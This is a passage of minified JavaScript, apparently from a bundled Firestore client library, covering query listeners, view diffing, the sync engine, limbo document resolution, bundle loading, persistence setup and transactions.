Ou=class{constructor(e,t,r){this.query=e,this.ta=t,this.na=!1,this.ra=null,this.onlineState="Unknown",this.options=r||{}}X_(e){if(!this.options.includeMetadataChanges){let r=[];for(let i of e.docChanges)i.type!==3&&r.push(i);e=new da(e.query,e.docs,e.oldDocs,r,e.mutatedKeys,e.fromCache,e.syncStateChanged,!0,e.hasCachedResults)}let t=!1;return this.na?this.ia(e)&&(this.ta.next(e),t=!0):this.sa(e,this.onlineState)&&(this.oa(e),t=!0),this.ra=e,t}onError(e){this.ta.error(e)}Z_(e){this.onlineState=e;let t=!1;return this.ra&&!this.na&&this.sa(this.ra,e)&&(this.oa(this.ra),t=!0),t}sa(e,t){if(!e.fromCache||!this.J_())return!0;let r=t!=="Offline";return(!this.options._a||!r)&&(!e.docs.isEmpty()||e.hasCachedResults||t==="Offline")}ia(e){if(e.docChanges.length>0)return!0;let t=this.ra&&this.ra.hasPendingWrites!==e.hasPendingWrites;return!(!e.syncStateChanged&&!t)&&this.options.includeMetadataChanges===!0}oa(e){e=da.fromInitialDocuments(e.query,e.docs,e.mutatedKeys,e.fromCache,e.hasCachedResults),this.na=!0,this.ta.next(e)}J_(){return this.options.source!==Rw.Cache}};var Nw=class{constructor(e,t){this.aa=e,this.byteLength=t}ua(){return"metadata"in this.aa}};var Xf=class{constructor(e){this.serializer=e}Es(e){return Wn(this.serializer,e)}ds(e){return e.metadata.exists?gx(this.serializer,e.document,!1):at.newNoDocument(this.Es(e.metadata.name),this.As(e.metadata.readTime))}As(e){return Xe(e)}},Pw=class{constructor(e,t,r){this.ca=e,this.localStore=t,this.serializer=r,this.queries=[],this.documents=[],this.collectionGroups=new Set,this.progress=$x(e)}la(e){this.progress.bytesLoaded+=e.byteLength;let t=this.progress.documentsLoaded;if(e.aa.namedQuery)this.queries.push(e.aa.namedQuery);else if(e.aa.documentMetadata){this.documents.push({metadata:e.aa.documentMetadata}),e.aa.documentMetadata.exists||++t;let r=ve.fromString(e.aa.documentMetadata.name);this.collectionGroups.add(r.get(r.length-2))}else e.aa.document&&(this.documents[this.documents.length-1].document=e.aa.document,++t);return t!==this.progress.documentsLoaded?(this.progress.documentsLoaded=t,Object.assign({},this.progress)):null}ha(e){let t=new Map,r=new Xf(this.serializer);for(let i of e)if(i.metadata.queries){let o=r.Es(i.metadata.name);for(let s of i.metadata.queries){let a=(t.get(s)||ie()).add(o);t.set(s,a)}}return t}complete(){return R(this,null,function*(){let e=yield g$(this.localStore,new Xf(this.serializer),this.documents,this.ca.id),t=this.ha(this.documents);for(let r of this.queries)yield m$(this.localStore,r,t.get(r.name));return this.progress.taskState="Success",{progress:this.progress,Pa:this.collectionGroups,Ia:e}})}};function $x(n){return{taskState:"Running",documentsLoaded:0,bytesLoaded:0,totalDocuments:n.totalDocuments,totalBytes:n.totalBytes}}var ep=class{constructor(e){this.key=e}},tp=class{constructor(e){this.key=e}},np=class{constructor(e,t){this.query=e,this.Ta=t,this.Ea=null,this.hasCachedResults=!1,this.current=!1,this.da=ie(),this.mutatedKeys=ie(),this.Aa=QM(e),this.Ra=new Zf(this.Aa)}get Va(){return this.Ta}ma(e,t){let r=t?t.fa:new Jf,i=t?t.Ra:this.Ra,o=t?t.mutatedKeys:this.mutatedKeys,s=i,a=!1,c=this.query.limitType==="F"&&i.size===this.query.limit?i.last():null,l=this.query.limitType==="L"&&i.size===this.query.limit?i.first():null;if(e.inorderTraversal((h,p)=>{let m=i.get(h),y=$u(this.query,p)?p:null,D=!!m&&this.mutatedKeys.has(m.key),b=!!y&&(y.hasLocalMutations||this.mutatedKeys.has(y.key)&&y.hasCommittedMutations),T=!1;m&&y?m.data.isEqual(y.data)?D!==b&&(r.track({type:3,doc:y}),T=!0):this.ga(m,y)||(r.track({type:2,doc:y}),T=!0,(c&&this.Aa(y,c)>0||l&&this.Aa(y,l)<0)&&(a=!0)):!m&&y?(r.track({type:0,doc:y}),T=!0):m&&!y&&(r.track({type:1,doc:m}),T=!0,(c||l)&&(a=!0)),T&&(y?(s=s.add(y),o=b?o.add(h):o.delete(h)):(s=s.delete(h),o=o.delete(h)))}),this.query.limit!==null)for(;s.size>this.query.limit;){let h=this.query.limitType==="F"?s.last():s.first();s=s.delete(h.key),o=o.delete(h.key),r.track({type:1,doc:h})}return{Ra:s,fa:r,ns:a,mutatedKeys:o}}ga(e,t){return e.hasLocalMutations&&t.hasCommittedMutations&&!t.hasLocalMutations}applyChanges(e,t,r,i){let o=this.Ra;this.Ra=e.Ra,this.mutatedKeys=e.mutatedKeys;let s=e.fa.G_();s.sort((h,p)=>function(y,D){let b=T=>{switch(T){case 0:return 1;case 2:case 3:return 2;case 1:return 0;default:return z()}};return b(y)-b(D)}(h.type,p.type)||this.Aa(h.doc,p.doc)),this.pa(r),i=i!=null&&i;let a=t&&!i?this.ya():[],c=this.da.size===0&&this.current&&!i?1:0,l=c!==this.Ea;return this.Ea=c,s.length!==0||l?{snapshot:new da(this.query,e.Ra,o,s,e.mutatedKeys,c===0,l,!1,!!r&&r.resumeToken.approximateByteSize()>0),wa:a}:{wa:a}}Z_(e){return this.current&&e==="Offline"?(this.current=!1,this.applyChanges({Ra:this.Ra,fa:new Jf,mutatedKeys:this.mutatedKeys,ns:!1},!1)):{wa:[]}}Sa(e){return!this.Ta.has(e)&&!!this.Ra.has(e)&&!this.Ra.get(e).hasLocalMutations}pa(e){e&&(e.addedDocuments.forEach(t=>this.Ta=this.Ta.add(t)),e.modifiedDocuments.forEach(t=>{}),e.removedDocuments.forEach(t=>this.Ta=this.Ta.delete(t)),this.current=e.current)}ya(){if(!this.current)return[];let e=this.da;this.da=ie(),this.Ra.forEach(r=>{this.Sa(r.key)&&(this.da=this.da.add(r.key))});let t=[];return e.forEach(r=>{this.da.has(r)||t.push(new tp(r))}),this.da.forEach(r=>{e.has(r)||t.push(new ep(r))}),t}ba(e){this.Ta=e.Ts,this.da=ie();let t=this.ma(e.documents);return this.applyChanges(t,!0)}Da(){return da.fromInitialDocuments(this.query,this.Ra,this.mutatedKeys,this.Ea===0,this.hasCachedResults)}},kw=class{constructor(e,t,r){this.query=e,this.targetId=t,this.view=r}},Ow=class{constructor(e){this.key=e,this.va=!1}},Fw=class{constructor(e,t,r,i,o,s){this.localStore=e,this.remoteStore=t,this.eventManager=r,this.sharedClientState=i,this.currentUser=o,this.maxConcurrentLimboResolutions=s,this.Ca={},this.Fa=new Zn(a=>WM(a),Bu),this.Ma=new Map,this.xa=new Set,this.Oa=new Fe(q.comparator),this.Na=new Map,this.La=new Nu,this.Ba={},this.ka=new Map,this.qa=aa.kn(),this.onlineState="Unknown",this.Qa=void 0}get isPrimaryClient(){return this.Qa===!0}};function x$(n,e,t=!0){return R(this,null,function*(){let r=yp(n),i,o=r.Fa.get(e);return o?(r.sharedClientState.addLocalQueryTarget(o.targetId),i=o.view.Da()):i=yield Hx(r,e,t,!0),i})}function R$(n,e){return R(this,null,function*(){let t=yp(n);yield Hx(t,e,!0,!1)})}function Hx(n,e,t,r){return R(this,null,function*(){let i=yield ca(n.localStore,Lt(e)),o=i.targetId,s=n.sharedClientState.addLocalQueryTarget(o,t),a;return r&&(a=yield DE(n,e,o,s==="current",i.resumeToken)),n.isPrimaryClient&&t&&mp(n.remoteStore,i),a})}function DE(n,e,t,r,i){return R(this,null,function*(){n.Ka=(p,m,y)=>function(b,T,F,$){return R(this,null,function*(){let P=T.view.ma(F);P.ns&&(P=yield qf(b.localStore,T.query,!1).then(({documents:E})=>T.view.ma(E,P)));let G=$&&$.targetChanges.get(T.targetId),Z=$&&$.targetMismatches.get(T.targetId)!=null,K=T.view.applyChanges(P,b.isPrimaryClient,G,Z);return Vw(b,T.targetId,K.wa),K.snapshot})}(n,p,m,y);let o=yield qf(n.localStore,e,!0),s=new np(e,o.Ts),a=s.ma(o.documents),c=Au.createSynthesizedTargetChangeForCurrentChange(t,r&&n.onlineState!=="Offline",i),l=s.applyChanges(a,n.isPrimaryClient,c);Vw(n,t,l.wa);let h=new kw(e,t,s);return n.Fa.set(e,h),n.Ma.has(t)?n.Ma.get(t).push(e):n.Ma.set(t,[e]),l.snapshot})}function N$(n,e,t){return R(this,null,function*(){let r=H(n),i=r.Fa.get(e),o=r.Ma.get(i.targetId);if(o.length>1)return r.Ma.set(i.targetId,o.filter(s=>!Bu(s,e))),void r.Fa.delete(e);r.isPrimaryClient?(r.sharedClientState.removeLocalQueryTarget(i.targetId),r.sharedClientState.isActiveQueryTarget(i.targetId)||(yield ua(r.localStore,i.targetId,!1).then(()=>{r.sharedClientState.clearQueryState(i.targetId),t&&la(r.remoteStore,i.targetId),ha(r,i.targetId)}).catch(Ai))):(ha(r,i.targetId),yield ua(r.localStore,i.targetId,!0))})}function P$(n,e){return R(this,null,function*(){let t=H(n),r=t.Fa.get(e),i=t.Ma.get(r.targetId);t.isPrimaryClient&&i.length===1&&(t.sharedClientState.removeLocalQueryTarget(r.targetId),la(t.remoteStore,r.targetId))})}function k$(n,e,t){return R(this,null,function*(){let r=SE(n);try{let i=yield function(s,a){let c=H(s),l=$e.now(),h=a.reduce((y,D)=>y.add(D.key),ie()),p,m;return c.persistence.runTransaction("Locally write mutations","readwrite",y=>{let D=Wt(),b=ie();return c.cs.getEntries(y,h).next(T=>{D=T,D.forEach((F,$)=>{$.isValidDocument()||(b=b.add(F))})}).next(()=>c.localDocuments.getOverlayedDocuments(y,D)).next(T=>{p=T;let F=[];for(let $ of a){let P=KB($,p.get($.key).overlayedDocument);P!=null&&F.push(new Rn($.key,P,jM(P.value.mapValue),We.exists(!0)))}return c.mutationQueue.addMutationBatch(y,l,F,a)}).next(T=>{m=T;let F=T.applyToLocalDocumentSet(p,b);return c.documentOverlayCache.saveOverlays(y,T.batchId,F)})}).then(()=>({batchId:m.batchId,changes:ZM(p)}))}(r.localStore,e);r.sharedClientState.addPendingMutation(i.batchId),function(s,a,c){let l=s.Ba[s.currentUser.toKey()];l||(l=new Fe(re)),l=l.insert(a,c),s.Ba[s.currentUser.toKey()]=l}(r,i.batchId,t),yield Pr(r,i.changes),yield _a(r.remoteStore)}catch(i){let o=Ea(i,"Failed to persist write");t.reject(o)}})}function qx(n,e){return R(this,null,function*(){let t=H(n);try{let r=yield f$(t.localStore,e);e.targetChanges.forEach((i,o)=>{let s=t.Na.get(o);s&&(Q(i.addedDocuments.size+i.modifiedDocuments.size+i.removedDocuments.size<=1),i.addedDocuments.size>0?s.va=!0:i.modifiedDocuments.size>0?Q(s.va):i.removedDocuments.size>0&&(Q(s.va),s.va=!1))}),yield Pr(t,r,e)}catch(r){yield Ai(r)}})}function gM(n,e,t){let r=H(n);if(r.isPrimaryClient&&t===0||!r.isPrimaryClient&&t===1){let i=[];r.Fa.forEach((o,s)=>{let a=s.view.Z_(e);a.snapshot&&i.push(a.snapshot)}),function(s,a){let c=H(s);c.onlineState=a;let l=!1;c.queries.forEach((h,p)=>{for(let m of p.j_)m.Z_(a)&&(l=!0)}),l&&IE(c)}(r.eventManager,e),i.length&&r.Ca.d_(i),r.onlineState=e,r.isPrimaryClient&&r.sharedClientState.setOnlineState(e)}}function O$(n,e,t){return R(this,null,function*(){let r=H(n);r.sharedClientState.updateQueryState(e,"rejected",t);let i=r.Na.get(e),o=i&&i.key;if(o){let s=new Fe(q.comparator);s=s.insert(o,at.newNoDocument(o,ee.min()));let a=ie().add(o),c=new Su(ee.min(),new Map,new Fe(re),s,a);yield qx(r,c),r.Oa=r.Oa.remove(o),r.Na.delete(e),TE(r)}else yield ua(r.localStore,e,!1).then(()=>ha(r,e,t)).catch(Ai)})}function F$(n,e){return R(this,null,function*(){let t=H(n),r=e.batch.batchId;try{let i=yield h$(t.localStore,e);bE(t,r,null),CE(t,r),t.sharedClientState.updateMutationState(r,"acknowledged"),yield Pr(t,i)}catch(i){yield Ai(i)}})}function V$(n,e,t){return R(this,null,function*(){let r=H(n);try{let i=yield function(s,a){let c=H(s);return c.persistence.runTransaction("Reject batch","readwrite-primary",l=>{let h;return c.mutationQueue.lookupMutationBatch(l,a).next(p=>(Q(p!==null),h=p.keys(),c.mutationQueue.removeMutationBatch(l,p))).next(()=>c.mutationQueue.performConsistencyCheck(l)).next(()=>c.documentOverlayCache.removeOverlaysForBatchId(l,h,a)).next(()=>c.localDocuments.recalculateAndSaveOverlaysForDocumentKeys(l,h)).next(()=>c.localDocuments.getDocuments(l,h))})}(r.localStore,e);bE(r,e,t),CE(r,e),r.sharedClientState.updateMutationState(e,"rejected",t),yield Pr(r,i)}catch(i){yield Ai(i)}})}function L$(n,e){return R(this,null,function*(){let t=H(n);xi(t.remoteStore)||O("SyncEngine","The network is disabled. The task returned by 'awaitPendingWrites()' will not complete until the network is enabled.");try{let r=yield function(s){let a=H(s);return a.persistence.runTransaction("Get highest unacknowledged batch id","readonly",c=>a.mutationQueue.getHighestUnacknowledgedBatchId(c))}(t.localStore);if(r===-1)return void e.resolve();let i=t.ka.get(r)||[];i.push(e),t.ka.set(r,i)}catch(r){let i=Ea(r,"Initialization of waitForPendingWrites() operation failed");e.reject(i)}})}function CE(n,e){(n.ka.get(e)||[]).forEach(t=>{t.resolve()}),n.ka.delete(e)}function bE(n,e,t){let r=H(n),i=r.Ba[r.currentUser.toKey()];if(i){let o=i.get(e);o&&(t?o.reject(t):o.resolve(),i=i.remove(e)),r.Ba[r.currentUser.toKey()]=i}}function ha(n,e,t=null){n.sharedClientState.removeLocalQueryTarget(e);for(let r of n.Ma.get(e))n.Fa.delete(r),t&&n.Ca.$a(r,t);n.Ma.delete(e),n.isPrimaryClient&&n.La.gr(e).forEach(r=>{n.La.containsKey(r)||zx(n,r)})}function zx(n,e){n.xa.delete(e.path.canonicalString());let t=n.Oa.get(e);t!==null&&(la(n.remoteStore,t),n.Oa=n.Oa.remove(e),n.Na.delete(t),TE(n))}function Vw(n,e,t){for(let r of t)r instanceof ep?(n.La.addReference(r.key,e),U$(n,r)):r instanceof tp?(O("SyncEngine","Document no longer in limbo: "+r.key),n.La.removeReference(r.key,e),n.La.containsKey(r.key)||zx(n,r.key)):z()}function U$(n,e){let t=e.key,r=t.path.canonicalString();n.Oa.get(t)||n.xa.has(r)||(O("SyncEngine","New document in limbo: "+t),n.xa.add(r),TE(n))}function TE(n){for(;n.xa.size>0&&n.Oa.size<n.maxConcurrentLimboResolutions;){let e=n.xa.values().next().value;n.xa.delete(e);let t=new q(ve.fromString(e)),r=n.qa.next();n.Na.set(r,new Ow(t)),n.Oa=n.Oa.insert(t,r),mp(n.remoteStore,new sa(Lt(ya(t.path)),r,"TargetPurposeLimboResolution",rn.oe))}}function Pr(n,e,t){return R(this,null,function*(){let r=H(n),i=[],o=[],s=[];r.Fa.isEmpty()||(r.Fa.forEach((a,c)=>{s.push(r.Ka(c,e,t).then(l=>{var h;if((l||t)&&r.isPrimaryClient){let p=l?!l.fromCache:(h=t?.targetChanges.get(c.targetId))===null||h===void 0?void 0:h.current;r.sharedClientState.updateQueryState(c.targetId,p?"current":"not-current")}if(l){i.push(l);let p=gw.Wi(c.targetId,l);o.push(p)}}))}),yield Promise.all(s),r.Ca.d_(i),yield function(c,l){return R(this,null,function*(){let h=H(c);try{yield h.persistence.runTransaction("notifyLocalViewChanges","readwrite",p=>M.forEach(l,m=>M.forEach(m.$i,y=>h.persistence.referenceDelegate.addReference(p,m.targetId,y)).next(()=>M.forEach(m.Ui,y=>h.persistence.referenceDelegate.removeReference(p,m.targetId,y)))))}catch(p){if(!Mi(p))throw p;O("LocalStore","Failed to update sequence numbers: "+p)}for(let p of l){let m=p.targetId;if(!p.fromCache){let y=h.os.get(m),D=y.snapshotVersion,b=y.withLastLimboFreeSnapshotVersion(D);h.os=h.os.insert(m,b)}}})}(r.localStore,o))})}function j$(n,e){return R(this,null,function*(){let t=H(n);if(!t.currentUser.isEqual(e)){O("SyncEngine","User change. New user:",e.toKey());let r=yield xx(t.localStore,e);t.currentUser=e,function(o,s){o.ka.forEach(a=>{a.forEach(c=>{c.reject(new k(N.CANCELLED,s))})}),o.ka.clear()}(t,"'waitForPendingWrites' promise is rejected due to a user change."),t.sharedClientState.handleUserChange(e,r.removedBatchIds,r.addedBatchIds),yield Pr(t,r.hs)}})}function B$(n,e){let t=H(n),r=t.Na.get(e);if(r&&r.va)return ie().add(r.key);{let i=ie(),o=t.Ma.get(e);if(!o)return i;for(let s of o){let a=t.Fa.get(s);i=i.unionWith(a.view.Va)}return i}}function $$(n,e){return R(this,null,function*(){let t=H(n),r=yield qf(t.localStore,e.query,!0),i=e.view.ba(r);return t.isPrimaryClient&&Vw(t,e.targetId,i.wa),i})}function H$(n,e){return R(this,null,function*(){let t=H(n);return kx(t.localStore,e).then(r=>Pr(t,r))})}function q$(n,e,t,r){return R(this,null,function*(){let i=H(n),o=yield function(a,c){let l=H(a),h=H(l.mutationQueue);return l.persistence.runTransaction("Lookup mutation documents","readonly",p=>h.Mn(p,c).next(m=>m?l.localDocuments.getDocuments(p,m):M.resolve(null)))}(i.localStore,e);o!==null?(t==="pending"?yield _a(i.remoteStore):t==="acknowledged"||t==="rejected"?(bE(i,e,r||null),CE(i,e),function(a,c){H(H(a).mutationQueue).On(c)}(i.localStore,e)):z(),yield Pr(i,o)):O("SyncEngine","Cannot apply mutation batch with id: "+e)})}function z$(n,e){return R(this,null,function*(){let t=H(n);if(yp(t),SE(t),e===!0&&t.Qa!==!0){let r=t.sharedClientState.getAllActiveQueryTargets(),i=yield mM(t,r.toArray());t.Qa=!0,yield Sw(t.remoteStore,!0);for(let o of i)mp(t.remoteStore,o)}else if(e===!1&&t.Qa!==!1){let r=[],i=Promise.resolve();t.Ma.forEach((o,s)=>{t.sharedClientState.isLocalQueryTarget(s)?r.push(s):i=i.then(()=>(ha(t,s),ua(t.localStore,s,!0))),la(t.remoteStore,s)}),yield i,yield mM(t,r),function(s){let a=H(s);a.Na.forEach((c,l)=>{la(a.remoteStore,l)}),a.La.pr(),a.Na=new Map,a.Oa=new Fe(q.comparator)}(t),t.Qa=!1,yield Sw(t.remoteStore,!1)}})}function mM(n,e,t){return R(this,null,function*(){let r=H(n),i=[],o=[];for(let s of e){let a,c=r.Ma.get(s);if(c&&c.length!==0){a=yield ca(r.localStore,Lt(c[0]));for(let l of c){let h=r.Fa.get(l),p=yield $$(r,h);p.snapshot&&o.push(p.snapshot)}}else{let l=yield Px(r.localStore,s);a=yield ca(r.localStore,l),yield DE(r,Gx(l),s,!1,a.resumeToken)}i.push(a)}return r.Ca.d_(o),i})}function Gx(n){return GM(n.path,n.collectionGroup,n.orderBy,n.filters,n.limit,"F",n.startAt,n.endAt)}function G$(n){return function(t){return H(H(t).persistence).Qi()}(H(n).localStore)}function W$(n,e,t,r){return R(this,null,function*(){let i=H(n);if(i.Qa)return void O("SyncEngine","Ignoring unexpected query state notification.");let o=i.Ma.get(e);if(o&&o.length>0)switch(t){case"current":case"not-current":{let s=yield kx(i.localStore,KM(o[0])),a=Su.createSynthesizedRemoteEventForCurrentChange(e,t==="current",et.EMPTY_BYTE_STRING);yield Pr(i,s,a);break}case"rejected":yield ua(i.localStore,e,!0),ha(i,e,r);break;default:z()}})}function K$(n,e,t){return R(this,null,function*(){let r=yp(n);if(r.Qa){for(let i of e){if(r.Ma.has(i)&&r.sharedClientState.isActiveQueryTarget(i)){O("SyncEngine","Adding an already active target "+i);continue}let o=yield Px(r.localStore,i),s=yield ca(r.localStore,o);yield DE(r,Gx(o),s.targetId,!1,s.resumeToken),mp(r.remoteStore,s)}for(let i of t)r.Ma.has(i)&&(yield ua(r.localStore,i,!1).then(()=>{la(r.remoteStore,i),ha(r,i)}).catch(Ai))}})}function yp(n){let e=H(n);return e.remoteStore.remoteSyncer.applyRemoteEvent=qx.bind(null,e),e.remoteStore.remoteSyncer.getRemoteKeysForTarget=B$.bind(null,e),e.remoteStore.remoteSyncer.rejectListen=O$.bind(null,e),e.Ca.d_=A$.bind(null,e.eventManager),e.Ca.$a=M$.bind(null,e.eventManager),e}function SE(n){let e=H(n);return e.remoteStore.remoteSyncer.applySuccessfulWrite=F$.bind(null,e),e.remoteStore.remoteSyncer.rejectFailedWrite=V$.bind(null,e),e}function Q$(n,e,t){let r=H(n);(function(o,s,a){return R(this,null,function*(){try{let c=yield s.getMetadata();if(yield function(y,D){let b=H(y),T=Xe(D.createTime);return b.persistence.runTransaction("hasNewerBundle","readonly",F=>b.Gr.getBundleMetadata(F,D.id)).then(F=>!!F&&F.createTime.compareTo(T)>=0)}(o.localStore,c))return yield s.close(),a._completeWith(function(y){return{taskState:"Success",documentsLoaded:y.totalDocuments,bytesLoaded:y.totalBytes,totalDocuments:y.totalDocuments,totalBytes:y.totalBytes}}(c)),Promise.resolve(new Set);a._updateProgress($x(c));let l=new Pw(c,o.localStore,s.serializer),h=yield s.Ua();for(;h;){let m=yield l.la(h);m&&a._updateProgress(m),h=yield s.Ua()}let p=yield l.complete();return yield Pr(o,p.Ia,void 0),yield function(y,D){let b=H(y);return b.persistence.runTransaction("Save bundle","readwrite",T=>b.Gr.saveBundleMetadata(T,D))}(o.localStore,c),a._completeWith(p.progress),Promise.resolve(p.Pa)}catch(c){return Mn("SyncEngine",`Loading bundle failed with ${c}`),a._failWith(c),Promise.resolve(new Set)}})})(r,e,t).then(i=>{r.sharedClientState.notifyBundleLoaded(i)})}var Lw=(()=>{class n{constructor(){this.kind="memory",this.synchronizeTabs=!1}initialize(t){return R(this,null,function*(){this.serializer=Hu(t.databaseInfo.databaseId),this.sharedClientState=this.Wa(t),this.persistence=this.Ga(t),yield this.persistence.start(),this.localStore=this.za(t),this.gcScheduler=this.ja(t,this.localStore),this.indexBackfillerScheduler=this.Ha(t,this.localStore)})}ja(t,r){return null}Ha(t,r){return null}za(t){return Mx(this.persistence,new Hf,t.initialUser,this.serializer)}Ga(t){return new Bf($f.Zr,this.serializer)}Wa(t){return new Wf}terminate(){return R(this,null,function*(){var t,r;(t=this.gcScheduler)===null||t===void 0||t.stop(),(r=this.indexBackfillerScheduler)===null||r===void 0||r.stop(),this.sharedClientState.shutdown(),yield this.persistence.shutdown()})}}return n.provider={build:()=>new n},n})();var rp=class n extends Lw{constructor(e,t,r){super(),this.Ja=e,this.cacheSizeBytes=t,this.forceOwnership=r,this.kind="persistent",this.synchronizeTabs=!1}initialize(e){return R(this,null,function*(){yield ng(n.prototype,this,"initialize").call(this,e),yield this.Ja.initialize(this,e),yield SE(this.Ja.syncEngine),yield _a(this.Ja.remoteStore),yield this.persistence.yi(()=>(this.gcScheduler&&!this.gcScheduler.started&&this.gcScheduler.start(),this.indexBackfillerScheduler&&!this.indexBackfillerScheduler.started&&this.indexBackfillerScheduler.start(),Promise.resolve()))})}za(e){return Mx(this.persistence,new Hf,e.initialUser,this.serializer)}ja(e,t){let r=this.persistence.referenceDelegate.garbageCollector;return new X_(r,e.asyncQueue,t)}Ha(e,t){let r=new m_(t,this.persistence);return new g_(e.asyncQueue,r)}Ga(e){let t=mE(e.databaseInfo.databaseId,e.databaseInfo.persistenceKey),r=this.cacheSizeBytes!==void 0?gn.withCacheSize(this.cacheSizeBytes):gn.DEFAULT;return new pw(this.synchronizeTabs,t,e.clientId,r,e.asyncQueue,Fx(),mf(),this.serializer,this.sharedClientState,!!this.forceOwnership)}Wa(e){return new Wf}},Uw=class n extends rp{constructor(e,t){super(e,t,!1),this.Ja=e,this.cacheSizeBytes=t,this.synchronizeTabs=!0}initialize(e){return R(this,null,function*(){yield ng(n.prototype,this,"initialize").call(this,e);let t=this.Ja.syncEngine;this.sharedClientState instanceof yu&&(this.sharedClientState.syncEngine={no:q$.bind(null,t),ro:W$.bind(null,t),io:K$.bind(null,t),Qi:G$.bind(null,t),eo:H$.bind(null,t)},yield this.sharedClientState.start()),yield this.persistence.yi(r=>R(this,null,function*(){yield z$(this.Ja.syncEngine,r),this.gcScheduler&&(r&&!this.gcScheduler.started?this.gcScheduler.start():r||this.gcScheduler.stop()),this.indexBackfillerScheduler&&(r&&!this.indexBackfillerScheduler.started?this.indexBackfillerScheduler.start():r||this.indexBackfillerScheduler.stop())}))})}Wa(e){let t=Fx();if(!yu.D(t))throw new k(N.UNIMPLEMENTED,"IndexedDB persistence is only available on platforms that support LocalStorage.");let r=mE(e.databaseInfo.databaseId,e.databaseInfo.persistenceKey);return new yu(t,e.asyncQueue,r,e.clientId,e.initialUser)}},AE=(()=>{class n{initialize(t,r){return R(this,null,function*(){this.localStore||(this.localStore=t.localStore,this.sharedClientState=t.sharedClientState,this.datastore=this.createDatastore(r),this.remoteStore=this.createRemoteStore(r),this.eventManager=this.createEventManager(r),this.syncEngine=this.createSyncEngine(r,!t.synchronizeTabs),this.sharedClientState.onlineStateHandler=i=>gM(this.syncEngine,i,1),this.remoteStore.remoteSyncer.handleCredentialChange=j$.bind(null,this.syncEngine),yield Sw(this.remoteStore,this.syncEngine.isPrimaryClient))})}createEventManager(t){return function(){return new xw}()}createDatastore(t){let r=Hu(t.databaseInfo.databaseId),i=function(s){return new Ew(s)}(t.databaseInfo);return function(s,a,c,l){return new Cw(s,a,c,l)}(t.authCredentials,t.appCheckCredentials,i,r)}createRemoteStore(t){return function(i,o,s,a,c){return new Tw(i,o,s,a,c)}(this.localStore,this.datastore,t.asyncQueue,r=>gM(this.syncEngine,r,0),function(){return Kf.D()?new Kf:new _w}())}createSyncEngine(t,r){return function(o,s,a,c,l,h,p){let m=new Fw(o,s,a,c,l,h);return p&&(m.Qa=!0),m}(this.localStore,this.remoteStore,this.eventManager,this.sharedClientState,t.initialUser,t.maxConcurrentLimboResolutions,r)}terminate(){return R(this,null,function*(){var t,r;yield function(o){return R(this,null,function*(){let s=H(o);O("RemoteStore","RemoteStore shutting down."),s.L_.add(5),yield va(s),s.k_.shutdown(),s.q_.set("Unknown")})}(this.remoteStore),(t=this.datastore)===null||t===void 0||t.terminate(),(r=this.eventManager)===null||r===void 0||r.terminate()})}}return n.provider={build:()=>new n},n})();function yM(n,e=10240){let t=0;return{read(){return R(this,null,function*(){if(t<n.byteLength){let i={value:n.slice(t,t+e),done:!1};return t+=e,i}return{done:!0}})},cancel(){return R(this,null,function*(){})},releaseLock(){},closed:Promise.resolve()}}var fa=class{constructor(e){this.observer=e,this.muted=!1}next(e){this.muted||this.observer.next&&this.Ya(this.observer.next,e)}error(e){this.muted||(this.observer.error?this.Ya(this.observer.error,e):Ze("Uncaught Error in snapshot listener:",e.toString()))}Za(){this.muted=!0}Ya(e,t){setTimeout(()=>{this.muted||e(t)},0)}};var jw=class{constructor(e,t){this.Xa=e,this.serializer=t,this.metadata=new lt,this.buffer=new Uint8Array,this.eu=function(){return new TextDecoder("utf-8")}(),this.tu().then(r=>{r&&r.ua()?this.metadata.resolve(r.aa.metadata):this.metadata.reject(new Error(`The first element of the bundle is not a metadata, it is
             ${JSON.stringify(r?.aa)}`))},r=>this.metadata.reject(r))}close(){return this.Xa.cancel()}getMetadata(){return R(this,null,function*(){return this.metadata.promise})}Ua(){return R(this,null,function*(){return yield this.getMetadata(),this.tu()})}tu(){return R(this,null,function*(){let e=yield this.nu();if(e===null)return null;let t=this.eu.decode(e),r=Number(t);isNaN(r)&&this.ru(`length string (${t}) is not valid number`);let i=yield this.iu(r);return new Nw(JSON.parse(i),e.length+r)})}su(){return this.buffer.findIndex(e=>e===123)}nu(){return R(this,null,function*(){for(;this.su()<0&&!(yield this.ou()););if(this.buffer.length===0)return null;let e=this.su();e<0&&this.ru("Reached the end of bundle when a length string is expected.");let t=this.buffer.slice(0,e);return this.buffer=this.buffer.slice(e),t})}iu(e){return R(this,null,function*(){for(;this.buffer.length<e;)(yield this.ou())&&this.ru("Reached the end of bundle when more is expected.");let t=this.eu.decode(this.buffer.slice(0,e));return this.buffer=this.buffer.slice(e),t})}ru(e){throw this.Xa.cancel(),new Error(`Invalid bundle format: ${e}`)}ou(){return R(this,null,function*(){let e=yield this.Xa.read();if(!e.done){let t=new Uint8Array(this.buffer.length+e.value.length);t.set(this.buffer),t.set(e.value,this.buffer.length),this.buffer=t}return e.done})}};var Bw=class{constructor(e){this.datastore=e,this.readVersions=new Map,this.mutations=[],this.committed=!1,this.lastTransactionError=null,this.writtenDocs=new Set}lookup(e){return R(this,null,function*(){if(this.ensureCommitNotCalled(),this.mutations.length>0)throw this.lastTransactionError=new k(N.INVALID_ARGUMENT,"Firestore transactions require all reads to be executed before all writes."),this.lastTransactionError;let t=yield function(i,o){return R(this,null,function*(){let s=H(i),a={documents:o.map(p=>Mu(s.serializer,p))},c=yield s.Lo("BatchGetDocuments",s.serializer.databaseId,ve.emptyPath(),a,o.length),l=new Map;c.forEach(p=>{let m=e$(s.serializer,p);l.set(m.key.toString(),m)});let h=[];return o.forEach(p=>{let m=l.get(p.toString());Q(!!m),h.push(m)}),h})}(this.datastore,e);return t.forEach(r=>this.recordVersion(r)),t})}set(e,t){this.write(t.toMutation(e,this.precondition(e))),this.writtenDocs.add(e.toString())}update(e,t){try{this.write(t.toMutation(e,this.preconditionForUpdate(e)))}catch(r){this.lastTransactionError=r}this.writtenDocs.add(e.toString())}delete(e){this.write(new Ti(e,this.precondition(e))),this.writtenDocs.add(e.toString())}commit(){return R(this,null,function*(){if(this.ensureCommitNotCalled(),this.lastTransactionError)throw this.lastTransactionError;let e=this.readVersions;this.mutations.forEach(t=>{e.delete(t.key.toString())}),e.forEach((t,r)=>{let i=q.fromPath(r);this.mutations.push(new Cu(i,this.precondition(i)))}),yield function(r,i){return R(this,null,function*(){let o=H(r),s={writes:i.map(a=>xu(o.serializer,a))};yield o.Mo("Commit",o.serializer.databaseId,ve.emptyPath(),s)})}(this.datastore,this.mutations),this.committed=!0})}recordVersion(e){let t;if(e.isFoundDocument())t=e.version;else{if(!e.isNoDocument())throw z();t=ee.min()}let 